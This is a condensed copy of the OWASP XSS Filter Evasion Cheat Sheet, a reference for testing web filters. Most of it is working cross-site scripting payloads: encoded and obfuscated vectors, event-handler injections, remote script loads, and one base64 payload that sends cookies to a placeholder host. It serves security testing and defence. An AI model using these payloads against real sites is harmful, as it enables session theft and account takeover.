# XSS Filter Evasion Cheat Sheet

## Introduction

Cross Site Scripting (XSS) testing guide for application security professionals. Originally based on RSnake's seminal XSS Cheat Sheet, previously at `http://ha.ckers.org/xss.html`; OWASP Cheat Sheet Series now maintains updated version. First OWASP Cheat Sheet, [Cross Site Scripting Prevention](Cross_Site_Scripting_Prevention.md), inspired by RSnake's work. Thanks RSnake.

## Tests

Shows input filtering = incomplete XSS defense; supplies XSS attacks bypassing certain XSS filters.

### Basic XSS Test Without Filter Evasion

Baseline: host script containing only `alert('XSS')` on HTTPS endpoint you control. Replace placeholder URL below with script's URL:

```html
<SCRIPT SRC=https://example.com/xss-test.js></SCRIPT>
```

Use script you reviewed and control: external scripts execute in context of tested page. Mutable third-party script can change what runs during test.

### XSS Locator (Polyglot)

'Polyglot test XSS payload' executes in multiple contexts: HTML, script strings, JavaScript, URLs:

```js
javascript:/*--></title></style></textarea></script></xmp>
<svg/onload='+/"`/+/onmouseover=1/+/[*/[]/+alert(42);//'>
```

(Based on tweet by Gareth Heyes).

### Malformed A Tags

Skips `href` attribute to demonstrate XSS via event handlers:

```js
\<a onmouseover="alert(document.cookie)"\>xxs link\</a\>
```

Chrome automatically inserts missing quotes. If issues, omit them; Chrome places missing quotes in URLs or scripts:

```js
\<a onmouseover=alert(document.cookie)\>xxs link\</a\>
```

(Submitted by David Cross, Verified on Chrome)

### Malformed IMG Tags

Uses relaxed rendering engine to create XSS vector within IMG tag (must be encapsulated in quotes). Probably originally meant to correct sloppy coding; also makes correct HTML tag parsing significantly harder:

```html
<IMG """><SCRIPT>alert("XSS")</SCRIPT>"\>
```

(Originally found by Begeek, cleaned up and shortened to work in all browsers)

### fromCharCode

System disallows quotes of any kind → `eval()` a `fromCharCode` in JavaScript to create any XSS vector:

```html
<a href="javascript:alert(String.fromCharCode(88,83,83))">Click Me!</a>
```

### Default SRC Tag to Get Past Filters that Check SRC Domain

Bypasses most SRC domain filters. JavaScript in event handler also applies to any HTML tag type injection (Form, Iframe, Input, Embed, etc.). Any relevant event substitutable for tag type, e.g. `onblur` or `onclick`, giving extensive variations:

```html
<IMG SRC=# onmouseover="alert('xxs')">
```

(Submitted by David Cross and edited by Abdullah Hussam)

### Default SRC Tag by Leaving it Empty

```html
<IMG SRC= onmouseover="alert('xxs')">
```

### Default SRC Tag by Leaving it out Entirely

```html
<IMG onmouseover="alert('xxs')">
```

### On Error Alert

```html
<IMG SRC=/ onerror="alert(String.fromCharCode(88,83,83))"></img>
```

### IMG onerror and JavaScript Alert Encode

```html
<img src=x onerror="&#0000106&#0000097&#0000118&#0000097&#0000115&#0000099&#0000114&#0000105&#0000112&#0000116&#0000058&#0000097&#0000108&#0000101&#0000114&#0000116&#0000040&#0000039&#0000088&#0000083&#0000083&#0000039&#0000041">
```

### Decimal HTML Character References

XSS examples using `javascript:` directive inside `<IMG` tag don't work on Firefox; workaround: decimal HTML character references:

```html

 <a href="&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;&#97;&#108;&#101;&#114;&#116;&#40;&#39;&#88;&#83;&#83;&#39;&#41;">Click Me!</a>
```

### Decimal HTML Character References Without Trailing Semicolons

Often bypasses XSS filters looking for string `&\#XX;`; most don't know padding works up to 7 numeric characters total. Also useful against filters decoding with strings like `$tmp\_string =\~ s/.\*\\&\#(\\d+);.\*/$1/;`, which wrongly assume semicolon required to terminate HTML encoded string (seen in the wild):

```html
<a href="&#0000106&#0000097&#0000118&#0000097&#0000115&#0000099&#0000114&#0000105&#0000112&#0000116&#0000058&#0000097&#0000108&#0000101&#0000114&#0000116&#0000040&#0000039&#0000088&#0000083&#0000083&#0000039&#0000041">Click Me</a>
```

### Hexadecimal HTML Character References Without Trailing Semicolons

Also works against filter for string `$tmp\_string=\~ s/.\*\\&\#(\\d+);.\*/$1/;`, which assumes numeric character follows pound symbol; false for hex HTML characters:

```html
<a href="&#x6A&#x61&#x76&#x61&#x73&#x63&#x72&#x69&#x70&#x74&#x3A&#x61&#x6C&#x65&#x72&#x74&#x28&#x27&#x58&#x53&#x53&#x27&#x29">Click Me</a>
```

### Embedded Tab

This approach breaks up the XSS attack:

<!-- markdownlint-disable MD010-->

```html
 <a href="jav	ascript:alert('XSS');">Click Me</a>
```

<!-- markdownlint-enable MD010-->

### Embedded Encoded Tab

This approach can also break up XSS:

```html
 <a href="jav&#x09;ascript:alert('XSS');">Click Me</a>
```

### Embedded Newline to Break Up XSS

Some defenders claim any of chars 09-13 (decimal) work; incorrect. Only 09 (horizontal tab), 10 (newline), 13 (carriage return) work. See ASCII table. Next four examples illustrate vector:

```html
<a href="jav&#x0A;ascript:alert('XSS');">Click Me</a>
```

#### Example 1: Break Up XSS Attack with Embedded Carriage Return

(Note: strings above longer than needed; zeros could be omitted. Filters often assume hex and dec encoding must be two or three characters. Real rule: 1-7 characters.):

```html
<a href="jav&#x0D;ascript:alert('XSS');">Click Me</a>
```

#### Example 2: Break Up JavaScript Directive with Null

Null chars also work as XSS vectors, but must be injected directly, e.g. Burp Proxy, `%00` in URL string, vim (`^V^@` produces null), or own injection tool writing to text file using program below. Null char `%00` much more useful; helped bypass certain real world filters with variation on this example:

```sh
perl -e 'print "<IMG SRC=java\0script:alert(\"XSS\")>";' > out
```

#### Example 3: Spaces and Meta Chars Before the JavaScript in Images for XSS

Useful if filter's pattern match ignores spaces in `javascript:` word (correct, won't render) but falsely assumes no space allowed between quote and `javascript:` keyword. Reality: any char 1-32 decimal allowed:

```html
<a href=" &#14;  javascript:alert('XSS');">Click Me</a>
```

#### Example 4: Non-alpha-non-digit XSS

Firefox HTML parser treats non-alpha-non-digit after HTML keyword as invalid, considers it whitespace or non-valid token after HTML tag. Some XSS filters assume tag they seek is broken by whitespace. E.g. `\<SCRIPT\\s` != `\<SCRIPT/XSS\\s`:

```html
<SCRIPT/XSS SRC="http://xss.rocks/xss.js"></SCRIPT>
```

Same idea, expanded using Rsnake's fuzzer. Gecko rendering engine allows any character other than letters, numbers, encapsulation chars (quotes, angle brackets, etc) between event handler and equals sign, easing cross site scripting block bypass. Also applies to grave accent char:

```html
<BODY onload!#$%&()*~+-_.,:;?@[/|\]^`=alert("XSS")>
```

Yair Amit: slight behavior difference between Trident (IE) and Gecko (Firefox) rendering engines allows just slash between tag and parameter, no spaces. Useful if system disallows spaces:

```html
<SCRIPT/SRC="http://xss.rocks/xss.js"></SCRIPT>
```

### Extraneous Open Brackets

Could defeat detection engines that check matching pairs of open/close angle brackets then compare inside tag, instead of more efficient algorithm like Boyer-Moore looking for entire string matches of open angle bracket plus associated tag (post de-obfuscation). Double slash comments out ending extraneous bracket, suppressing JavaScript error:

```html
<<SCRIPT>alert("XSS");//\<</SCRIPT>
```

(Submitted by Franz Sedlmaier)

### No Closing Script Tags

Firefox: `\></SCRIPT>` portion unnecessary; Firefox assumes safe to close HTML tag, adds closing tags. Unlike next attack (doesn't affect Firefox), needs no additional HTML below. Quotes can be added if needed, normally unnecessary:

```html
<SCRIPT SRC=http://xss.rocks/xss.js?< B >
```

### Protocol Resolution in Script Tags

Partially based on Ozh's protocol resolution bypass below; works in IE and Edge in compatibility mode. Especially useful where space is an issue; shorter domain better. `.j` valid regardless of encoding type because browser knows it in SCRIPT tag context:

```html
<SCRIPT SRC=//xss.rocks/.j>
```

(Submitted by Łukasz Pilorz)

### Half Open HTML/JavaScript XSS Vector

Unlike Firefox, IE rendering engine (Trident) adds no extra data to page, but allows `javascript:` directive in images. Useful vector since no close angle bracket needed. Assumes any HTML tag exists below injection point; tags below close it even without close `\>`. Note: messes up HTML depending on what's beneath. Bypasses network intrusion detection system (NIDS) regex `/((\\%3D)|(=))\[^\\n\]\*((\\%3C)|\<)\[^\\n\]+((\\%3E)|\>)/` since no end `\>` needed. Also effective against real world XSS filter using open ended `<IFRAME` tag instead of `<IMG` tag.

```html
<IMG SRC="`<javascript:alert>`('XSS')"
```

### Escaping JavaScript Escapes

App outputs user info inside JavaScript (e.g. `<SCRIPT>var a="$ENV{QUERY\_STRING}";</SCRIPT>`) but server-side escapes certain quotes → circumvent by escaping their escape character. Injected, reads `<SCRIPT>var a="\\\\";alert('XSS');//";</SCRIPT>`, un-escaping double quote and firing XSS vector. XSS locator uses this method:

```js
\";alert('XSS');//
```

Alternative, if correct JSON or JavaScript escaping applied to embedded data but not HTML encoding: finish script block and start own:

```js
</script><script>alert('XSS');</script>
```

### End Title Tag

Simple vector closing `<TITLE>` tags, which can encapsulate malicious XSS attack:

```html
</TITLE><SCRIPT>alert("XSS");</SCRIPT>
```

#### INPUT Image

```html
<INPUT TYPE="IMAGE" SRC="javascript:alert('XSS');">
```

#### BODY Image

```html
<BODY BACKGROUND="javascript:alert('XSS')">
```

#### IMG Dynsrc

```html
<IMG DYNSRC="javascript:alert('XSS')">
```

#### IMG Lowsrc

```html
<IMG LOWSRC="javascript:alert('XSS')">
```

### List-style-image

Esoteric attack embedding images for bulleted lists. Works only in IE rendering engine (JavaScript directive). Not particularly useful:

```html
<STYLE>li {list-style-image: url("javascript:alert('XSS')");}</STYLE><UL><LI>XSS</br>
```

### VBscript in an Image

```html
<IMG SRC='vbscript:msgbox("XSS")'>
```

### SVG Object Tag

```js
<svg/onload=alert('XSS')>
```

### ECMAScript 6

```js
Set.constructor`alert\x28document.domain\x29
```

### BODY Tag

Needs no variants of `javascript:` or `<SCRIPT...`. Dan Crowley: space allowed before equals sign (`onload=` != `onload =`):

```html
<BODY ONLOAD=alert('XSS')>
```

#### Attacks Using Event Handlers

BODY tag attack adaptable to similar XSS attacks (most comprehensive list on the net at time of writing). Thanks to Rene Ledosquet for HTML+TIME updates.

Dottoro Web Reference also has list of events in JavaScript.

- `onAbort()` (user aborts image loading)
- `onActivate()` (object set as active element)
- `onAfterPrint()` (after user prints or previews print job)
- `onAfterUpdate()` (on data object after updating data in source object)
- `onBeforeActivate()` (before object set as active element)
- `onBeforeCopy()` (attacker executes attack string right before selection copied to clipboard; attackers can use `execCommand("Copy")` function)
- `onBeforeCut()` (attacker executes attack string right before selection cut)
- `onBeforeDeactivate()` (right after activeElement changed from current object)
- `onBeforeEditFocus()` (before object in editable element enters UI-activated state, or editable container object control selected)
- `onBeforePaste()` (user tricked into pasting, or forced via `execCommand("Paste")` function)
- `onBeforePrint()` (user tricked into printing, or attacker uses `print()` or `execCommand("Print")` function).
- `onBeforeUnload()` (user tricked into closing browser; attacker cannot unload windows unless spawned from parent)
- `onBeforeUpdate()` (on data object before updating data in source object)
- `onBegin()` (onbegin fires immediately when element's timeline begins)
- `onBlur()` (another popup loaded, window loses focus)
- `onBounce()` (marquee behavior property set to "alternate" and contents reach one side of window)
- `onCellChange()` (data changes in data provider)
- `onChange()` (select, text, or TEXTAREA field loses focus, value modified)
- `onClick()` (someone clicks on form)
- `onContextMenu()` (user right clicks attack area)
- `onControlSelect()` (user about to make control selection of object)
- `onCopy()` (user copies something, or exploited via `execCommand("Copy")` command)
- `onCut()` (user copies something, or exploited via `execCommand("Cut")` command)
- `onDataAvailable()` (user changes data in element, or attacker does same)
- `onDataSetChanged()` (data set exposed by data source object changes)
- `onDataSetComplete()` (all data available from data source object)
- `onDblClick()` (user double-clicks form element or link)
- `onDeactivate()` (activeElement changed from current object to another object in parent document)
- `onDrag()` (user drags object)
- `onDragEnd()` (user drags object)
- `onDragLeave()` (user drags object off valid location)
- `onDragEnter()` (user drags object into valid location)
- `onDragOver()` (user drags object into valid location)
- `onDragDrop()` (user drops object (e.g. file) onto browser window)
- `onDragStart()` (user starts drag operation)
- `onDrop()` (user drops object (e.g. file) onto browser window)
- `onEnd()` (onEnd fires when timeline ends.
- `onError()` (loading document or image causes error)
- `onErrorUpdate()` (on data bound object when error occurs updating associated data in data source object)
- `onFilterChange()` (visual filter completes state change)
- `onFinish()` (attacker creates exploit when marquee finished looping)
- `onFocus()` (attacker executes attack string when window gets focus)
- `onFocusIn()` (attacker executes attack string when window gets focus)
- `onFocusOut()` (attacker executes attack string when window loses focus)
- `onHashChange()` (fragment identifier part of document's current address changed)
- `onHelp()` (attacker executes attack string when user hits F1 with window in focus)
- `onInput()` (element text content changed through user interface)
- `onKeyDown()` (user depresses key)
- `onKeyPress()` (user presses or holds key)
- `onKeyUp()` (user releases key)
- `onLayoutComplete()` (user must print or print preview)
- `onLoad()` (attacker executes attack string after window loads)
- `onLoseCapture()` (exploitable by `releaseCapture()` method)
- `onMediaComplete()` (streaming media file used; event could fire before file starts playing)
- `onMediaError()` (user opens page with media file; event fires on problem)
- `onMessage()` (document received message)
- `onMouseDown()` (attacker needs user to click image)
- `onMouseEnter()` (cursor moves over object or area)
- `onMouseLeave()` (attacker needs user to mouse over image or table and off again)
- `onMouseMove()` (attacker needs user to mouse over image or table)
- `onMouseOut()` (attacker needs user to mouse over image or table and off again)
- `onMouseOver()` (cursor moves over object or area)
- `onMouseUp()` (attacker needs user to click image)
- `onMouseWheel()` (attacker needs user to use mouse wheel)
- `onMove()` (user or attacker moves page)
- `onMoveEnd()` (user or attacker moves page)
- `onMoveStart()` (user or attacker moves page)
- `onOffline()` (browser in online mode starts working offline)
- `onOnline()` (browser in offline mode starts working online)
- `onOutOfSync()` (interrupt element's ability to play media as defined by timeline)
- `onPaste()` (user pastes, or attacker uses `execCommand("Paste")` function)
- `onPause()` (onpause fires on every element active when timeline pauses, incl. body element)
- `onPopState()` (user navigated session history)
- `onPropertyChange()` (user or attacker changes element property)
- `onReadyStateChange()` (user or attacker changes element property)
- `onRedo()` (user went forward in undo transaction history)
- `onRepeat()` (fires once per timeline repetition, excluding first full cycle)
- `onReset()` (user or attacker resets form)
- `onResize()` (user resizes window; attacker could auto initialize with something like: `<SCRIPT>self.resizeTo(500,400);</SCRIPT>`)
- `onResizeEnd()` (user resizes window; attacker could auto initialize with something like: `<SCRIPT>self.resizeTo(500,400);</SCRIPT>`)
- `onResizeStart()` (user resizes window; attacker could auto initialize with something like: `<SCRIPT>self.resizeTo(500,400);</SCRIPT>`)
- `onResume()` (onresume fires on every element becoming active when timeline resumes, incl. body element)
- `onReverse()` (element has repeatCount greater than one; fires every time timeline begins playing backward)
- `onRowsEnter()` (user or attacker changes row in data source)
- `onRowExit()` (user or attacker changes row in data source)
- `onRowDelete()` (user or attacker deletes row in data source)
- `onRowInserted()` (user or attacker inserts row in data source)
- `onScroll()` (user scrolls, or attacker uses `scrollBy()` function)
- `onSeek()` (`onReverse` event fires when timeline set to play in any direction other than forward)
- `onSelect()` (user selects text; attacker could auto initialize with something like: `window.document.execCommand("SelectAll");`)
- `onSelectionChange()` (user selects text; attacker could auto initialize with something like: `window.document.execCommand("SelectAll");`)
- `onSelectStart()` (user selects text; attacker could auto initialize with something like: `window.document.execCommand("SelectAll");`)
- `onStart()` (beginning of each marquee loop)
- `onStop()` (user presses stop button or leaves webpage)
- `onStorage()` (storage area changed)
- `onSyncRestored()` (user interrupts element's ability to play media as defined by timeline to fire)
- `onSubmit()` (attacker or user submits form)
- `onTimeError()` (user or attacker sets time property, such as dur, to invalid value)
- `onTrackChange()` (user or attacker changes track in playList)
- `onUndo()` (user went backward in undo transaction history)
- `onUnload()` (user clicks any link or presses back button, or attacker forces click)
- `onURLFlip()` (fires when Advanced Streaming Format (ASF) file, played by HTML+TIME (Timed Interactive Multimedia Extensions) media tag, processes script commands embedded in ASF file)
- `seekSegmentTime()` (method locating specified point on element's segment time line, begins playing from that point. Segment = one repetition of time line incl. reverse play using AUTOREVERSE attribute.)

#### BGSOUND

```js
<BGSOUND SRC="javascript:alert('XSS');">
```

#### & JavaScript includes

```html
<BR SIZE="&{alert('XSS')}">
```

#### STYLE sheet

```html
<LINK REL="stylesheet" HREF="javascript:alert('XSS');">
```

### Remote style sheet

Remote style sheet can include XSS since style parameter can be redefined using embedded expression. Works only in IE. Nothing on page shows included JavaScript. Note: all remote style sheet examples use body tag → won't work unless page has content other than vector; add single letter to otherwise blank page:

```html
<LINK REL="stylesheet" HREF="http://xss.rocks/xss.css">
```

#### Remote style sheet part 2

Same as above but `<STYLE>` tag instead of `<LINK>` tag. Slight variation used to hack Google Desktop. Can remove end `</STYLE>` tag if HTML immediately follows vector to close it. Useful when neither equals sign nor slash allowed in XSS attack (came up at least once in real world):

```html
<STYLE>@import'http://xss.rocks/xss.css';</STYLE>
```

#### Remote style sheet part 3

Works only in Gecko rendering engines; binds XUL file to parent page.

```html
<STYLE>BODY{-moz-binding:url("http://xss.rocks/xssmoz.xml#xss")}</STYLE>
```

### STYLE Tags that Breaks Up JavaScript for XSS

This XSS at times sends IE into an infinite loop of alerts:

```html
<STYLE>@im\port'\ja\vasc\ript:alert("XSS")';</STYLE>
```

### STYLE Attribute that Breaks Up an Expression

```html
<IMG STYLE="xss:expr/*XSS*/ession(alert('XSS'))">
```

(Created by Roman Ivanov)

### IMG STYLE with Expressions

Hybrid of last two XSS vectors; shows how hard STYLE tags are to parse apart. Can send IE into loop:

```html
exp/*<A STYLE='no\xss:noxss("*//*");
xss:ex/*XSS*//*/*/pression(alert("XSS"))'>
```

### STYLE Tag using Background-image

```html
<STYLE>.XSS{background-image:url("javascript:alert('XSS')");}</STYLE><A CLASS=XSS></A>
```

### STYLE Tag using Background

```html
<STYLE type="text/css">BODY{background:url("javascript:alert('XSS')")}</STYLE>
<STYLE type="text/css">BODY{background:url("<javascript:alert>('XSS')")}</STYLE>
```

### Anonymous HTML with STYLE Attribute

IE rendering engine doesn't care whether built HTML tag exists, as long as it starts with open angle bracket and letter:

```html
<XSS STYLE="xss:expression(alert('XSS'))">
```

### Local htc File

Differs from last two vectors: uses .htc file that must be on same server as XSS vector. Example file pulls in JavaScript and runs it as part of style attribute:

```html
<XSS STYLE="behavior: url(xss.htc);">
```

### US-ASCII Encoding

Uses malformed ASCII encoding with 7 bits instead of 8. May bypass many content filters but works only if host transmits in US-ASCII encoding or you set encoding yourself. More useful against web application firewall (WAF) XSS evasion than server side filter evasion. Apache Tomcat = only known server still transmitting US-ASCII by default.

```js
¼script¾alert(¢XSS¢)¼/script¾
```

### META

Meta refresh sends no referrer in header → usable for attacks needing no referring URLs:

```html
<META HTTP-EQUIV="refresh" CONTENT="0;url=javascript:alert('XSS');">
```

#### META using Data

Directive URL scheme. Nothing visible contains word SCRIPT or JavaScript directive (uses base64 encoding). See RFC 2397.

```html
<META HTTP-EQUIV="refresh" CONTENT="0;url=data:text/html base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4K">
```

#### META with Additional URL Parameter

Target website checks whether URL starts with `<http://>;` → evade filter rule with:

```html
<META HTTP-EQUIV="refresh" CONTENT="0; URL=http://;URL=javascript:alert('XSS');">
```

(Submitted by Moritz Naumann)

### IFRAME

iFrames allowed → many other XSS problems:

```html
<IFRAME SRC="javascript:alert('XSS');"></IFRAME>
```

### IFRAME Event Based

IFrames and most other elements can use event based mayhem like the following:

```html
<IFRAME SRC=# onmouseover="alert(document.cookie)"></IFRAME>
```

(Submitted by: David Cross)

### FRAME

Frames have the same sorts of XSS problems as iFrames

```html
<FRAMESET><FRAME SRC="javascript:alert('XSS');"></FRAMESET>
```

### TABLE

```html
<TABLE BACKGROUND="javascript:alert('XSS')">
```

#### TD

Just like above, TD's are vulnerable to BACKGROUNDs containing JavaScript XSS vectors:

```html
<TABLE><TD BACKGROUND="javascript:alert('XSS')">
```

### DIV

#### DIV Background-image

```html
<DIV STYLE="background-image: url(javascript:alert('XSS'))">
```

#### DIV Background-image with Unicode XSS Exploit

Slightly modified to obfuscate URL parameter:

```html
<DIV STYLE="background-image:\0075\0072\006C\0028'\006a\0061\0076\0061\0073\0063\0072\0069\0070\0074\003a\0061\006c\0065\0072\0074\0028.1027\0058.1053\0053\0027\0029'\0029">
```

(Original vulnerability found by Renaud Lifchitz in Hotmail)

#### DIV Background-image Plus Extra Characters

RSnake built quick XSS fuzzer detecting erroneous characters allowed after open parenthesis but before JavaScript directive in IE. In decimal but hex and padding includable. (Allowed chars: 1-32, 34, 39, 160, 8192-8.13, 12288, 65279):

```html
<DIV STYLE="background-image: url(javascript:alert('XSS'))">
```

#### DIV Expression

Variant effective against real-world XSS filter using newline between colon and `expression`:

```html
<DIV STYLE="width: expression(alert('XSS'));">
```

### Downlevel-Hidden Block

Only works on IE rendering engine, Trident. Some websites consider anything inside comment block safe, not needing removal → XSS vector survives. Or system adds comment tags around something in vain attempt to render harmless; likely ineffective:

```js
<!--[if gte IE 4]>
<SCRIPT>alert('XSS');</SCRIPT>
<![endif]-->
```

### BASE Tag

(Works on IE in safe mode) Needs `//` to comment out next characters so no JavaScript error and XSS tag renders. Relies on many websites using dynamically placed images like `images/image.jpg` not full paths. Path with leading forward slash like `/images/image.jpg` → remove one slash from vector (works as long as two begin the comment):

```html
<BASE HREF="javascript:alert('XSS');//">
```

### OBJECT Tag

System allows objects → can also inject virus payloads infecting users, etc. with APPLET tag. Linked file is HTML file that can contain XSS:

```html
<OBJECT TYPE="text/x-scriptlet" DATA="http://xss.rocks/scriptlet.html"></OBJECT>
```

### EMBED SVG Which Contains XSS Vector

This attack only works in Firefox:

```html
<EMBED SRC="data:image/svg+xml;base64,PHN2ZyB4bWxuczpzdmc9Imh0dH A6Ly93d3cudzMub3JnLzIwMDAvc3ZnIiB4bWxucz0iaHR0cDovL3d3dy53My5vcmcv MjAwMC9zdmciIHhtbG5zOnhsaW5rPSJodHRwOi8vd3d3LnczLm9yZy8xOTk5L3hs aW5rIiB2ZXJzaW9uPSIxLjAiIHg9IjAiIHk9IjAiIHdpZHRoPSIxOTQiIGhlaWdodD0iMjAw IiBpZD0ieHNzIj48c2NyaXB0IHR5cGU9InRleHQvZWNtYXNjcmlwdCI+YWxlcnQoIlh TUyIpOzwvc2NyaXB0Pjwvc3ZnPg==" type="image/svg+xml" AllowScriptAccess="always"></EMBED>
```

(Thanks to nEUrOO for this one)

### XML Data Island with CDATA Obfuscation

This XSS attack works only in IE:

```html
<XML ID="xss"><I><B><IMG SRC="javas<!-- -->cript:alert('XSS')"></B></I></XML>
<SPAN DATASRC="#xss" DATAFLD="B" DATAFORMATAS="HTML"></SPAN>
```

### Locally hosted XML with embedded JavaScript that is generated using an XML data island

Nearly same as above, but refers to locally hosted (same server) XML file holding XSS vector. Result:

```html
<XML SRC="xsstest.xml" ID=I></XML>
<SPAN DATASRC=#I DATAFLD=C DATAFORMATAS=HTML></SPAN>
```

### HTML+TIME in XML

Works only in IE; must be between HTML and BODY tags:

```html
<HTML><BODY>
<?xml:namespace prefix="t" ns="urn:schemas-microsoft-com:time">
<?import namespace="t" implementation="#default#time2">
<t:set attributeName="innerHTML" to="XSS<SCRIPT DEFER>alert("XSS")</SCRIPT>">
</BODY></HTML>
```

<!-- textlint-disable terminology -->
(This is how Grey Magic hacked Hotmail and Yahoo!)
<!-- textlint-enable terminology -->

### Assuming you can only fit in a few characters and it filters against `.js`

This attack allows you to rename your JavaScript file to an image as an XSS vector:

```html
<SCRIPT SRC="http://xss.rocks/xss.jpg"></SCRIPT>
```

### SSI (Server Side Includes)

Requires SSI installed on server. If you can run commands on server, much more serious issues exist:

```js
<!--#exec cmd="/bin/echo '<SCR'"--><!--#exec cmd="/bin/echo 'IPT SRC=http://xss.rocks/xss.js></SCRIPT>'"-->
```

### PHP

Requires PHP installed on server. Again, if you can run scripts remotely like this, probably much more dire issues:

```php
<? echo('<SCR)';
echo('IPT>alert("XSS")</SCRIPT>'); ?>
```

### IMG Embedded Commands

Works only when injected (e.g. web-board) in web page behind password protection that works with other commands on same domain. Can delete users, add users (if visitor is administrator), send credentials elsewhere, etc. One of lesser used but more useful XSS vectors:

```html
<IMG SRC="http://www.thesiteyouareon.com/somecommand.php?somevariables=maliciouscode">
```

#### IMG Embedded Commands part II

More scary: nothing looks suspicious except image not hosted on your own domain. Vector uses 302 or 304 (others work too) to redirect image back to command. Normal `<IMG SRC="httx://badguy.com/a.jpg">` could be attack vector running commands as user viewing image link. `.htaccess` (Apache) line for vector:

```log
Redirect 302 /a.jpg http://victimsite.com/admin.asp&deleteuser
```

(Thanks to Timo for part of this)

### Cookie Manipulation

Obscure, but some cases allow `<META` and it can overwrite cookies. Some sites store username in cookie to display only to visiting user, instead of fetching from database. Combined: modify victim's cookie, displayed back as JavaScript (also usable to log people out, change user states, make them log in as you, etc):

```html
<META HTTP-EQUIV="Set-Cookie" Content="USERID=<SCRIPT>alert('XSS')</SCRIPT>">
```

### XSS Using HTML Quote Encapsulation

Originally tested in IE; mileage may vary. XSS on sites allowing `<SCRIPT>` but not `<SCRIPT SRC...` via regex filter `/\<script\[^\>\]+src/i`:

```html
<SCRIPT a=">" SRC="httx://xss.rocks/xss.js"></SCRIPT>
```

XSS on sites allowing `<SCRIPT>` but not `\<script src...` due to regex filter `/\<script((\\s+\\w+(\\s\*=\\s\*(?:"(.)\*?"|'(.)\*?'|\[^'"\>\\s\]+))?)+\\s\*|\\s\*)src/i` (important: regex seen in the wild):

```html
<SCRIPT =">" SRC="httx://xss.rocks/xss.js"></SCRIPT>
```

Another evasion of same filter: `/\<script((\\s+\\w+(\\s\*=\\s\*(?:"(.)\*?"|'(.)\*?'|\[^'"\>\\s\]+))?)+\\s\*|\\s\*)src/i`:

```html
<SCRIPT a=">" '' SRC="httx://xss.rocks/xss.js"></SCRIPT>
```

Yet another evasion of same filter: `/\<script((\\s+\\w+(\\s\*=\\s\*(?:"(.)\*?"|'(.)\*?'|\[^'"\>\\s\]+))?)+\\s\*|\\s\*)src/i`

Mitigation not generally discussed, but only a state machine stops this XSS example if `<SCRIPT>` tags still allowed but not remote script (other bypasses exist if `<SCRIPT>` tags allowed), use this:

```html
<SCRIPT "a='>'" SRC="httx://xss.rocks/xss.js"></SCRIPT>
```

Last evasion of `/\<script((\\s+\\w+(\\s\*=\\s\*(?:"(.)\*?"|'(.)\*?'|\[^'"\>\\s\]+))?)+\\s\*|\\s\*)src/i` using grave accents (doesn't work in Firefox):

<!-- markdownlint-disable MD038-->

```html
<SCRIPT a=`>` SRC="httx://xss.rocks/xss.js"></SCRIPT>
```

<!-- markdownlint-enable MD038-->

Works if regex doesn't catch matching pair of quotes but finds any quotes to terminate parameter string improperly:

```html
<SCRIPT a=">'>" SRC="httx://xss.rocks/xss.js"></SCRIPT>
```

This XSS still worries me, as it would be nearly impossible to stop this without blocking all active content:

```html
<SCRIPT>document.write("<SCRI");</SCRIPT>PT SRC="httx://xss.rocks/xss.js"></SCRIPT>
```

### URL String Evasion

Work if `http://www.google.com/` programmatically disallowed:

#### IP Versus Hostname

```html
<A HREF="http://66.102.7.147/">XSS</A>
```

#### URL Encoding

```html
<A HREF="http://%77%77%77%2E%67%6F%6F%67%6C%65%2E%63%6F%6D">XSS</A>
```

#### DWORD Encoding

Note: other DWORD encoding variations exist; see IP Obfuscation calculator below.

```html
<A HREF="http://1113982867/">XSS</A>
```

#### Hex Encoding

Total size of each allowed number ~240 total characters (see second digit); hex number between 0 and F → leading zero on third hex quote not required:

```html
<A HREF="http://0x42.0x0000066.0x7.0x93/">XSS</A>
```

#### Octal Encoding

Padding allowed, but keep above 4 total characters per class (class A, class B, etc):

```html
<A HREF="http://0102.0146.0007.00000223/">XSS</A>
```

#### Base64 Encoding

```html
<img onload="eval(atob('ZG9jdW1lbnQubG9jYXRpb249Imh0dHA6Ly9saXN0ZXJuSVAvIitkb2N1bWVudC5jb29raWU='))">
```

#### Mixed Encoding

Mix base encodings, add tabs and newlines (why browsers allow this, unknown). Tabs and newlines work only if encapsulated with quotes:

```html
<A HREF="h
tt  p://6	6.000146.0x7.147/">XSS</A>
```

<!-- markdownlint-enable MD010-->

#### Protocol Resolution Bypass

`//` translates to `http://`, saving a few bytes. Handy when space is an issue (two less characters go a long way); easily bypasses regex like `(ht|f)tp(s)?://` (thanks to Ozh for part of this one). `//` can also change to `\\\\`. Keep slashes in place, else interpreted as relative path URL:

```html
<A HREF="//www.google.com/">XSS</A>
```

#### Removing CNAMEs

Combined with above URL, removing `www.` saves additional 4 bytes, total 9 bytes saved for servers set up properly:

```html
<A HREF="http://google.com/">XSS</A>
```

Extra dot for absolute DNS:

```html
<A HREF="http://www.google.com./">XSS</A>
```

#### JavaScript Link Location

```html
<A HREF="javascript:document.location='http://www.google.com/'">XSS</A>
```

#### Content Replace as Attack Vector

<!-- markdownlint-disable MD010-->
`http://www.google.com/` programmatically replaced with nothing. Similar vector used against several real world XSS filters, using conversion filter itself to create vector (example): `java&\#x09;script:` converted into `java	script:`, which renders in IE:
<!-- markdownlint-enable MD010-->

```html
<A HREF="http://www.google.com/ogle.com/">XSS</A>
```

### Assisting XSS with HTTP Parameter Pollution

Works if content sharing flow implemented as below. `Content` page includes user-provided content and link to `Share` page where user picks favorite social sharing platform. Developers HTML encoded `title` parameter in `Content` page against XSS but didn't URL encode it against HTTP Parameter Pollution. Also assumed `content_type` value constant and always integer → no encoding or validation of `content_type` in `Share` page.

#### Content Page Source Code

```html
a href="/Share?content_type=1&title=<%=Encode.forHtmlAttribute(untrusted content title)%>">Share</a>
```

#### Share Page Source Code

```js
<script>
var contentType = <%=Request.getParameter("content_type")%>;
var title = "<%=Encode.forJavaScript(request.getParameter("title"))%>";
...
//some user agreement and sending to server logic might be here
...
</script>
```

#### Content Page Output

Attacker sets untrusted content title `This is a regular title&content_type=1;alert(1)` → link in `Content` page:

```html
<a href="/share?content_type=1&title=This is a regular title&amp;content_type=1;alert(1)">Share</a>
```

#### Share Page Output

And in share page output could be this:

```js
<script>
var contentType = 1; alert(1);
var title = "This is a regular title";
…
//some user agreement and sending to server logic might be here
…
</script>
```

Main flaw here: trusting content_type in `Share` page without proper encoding or validation. HTTP Parameter Pollution could raise XSS impact from reflected to stored.

## Character Escape Sequences

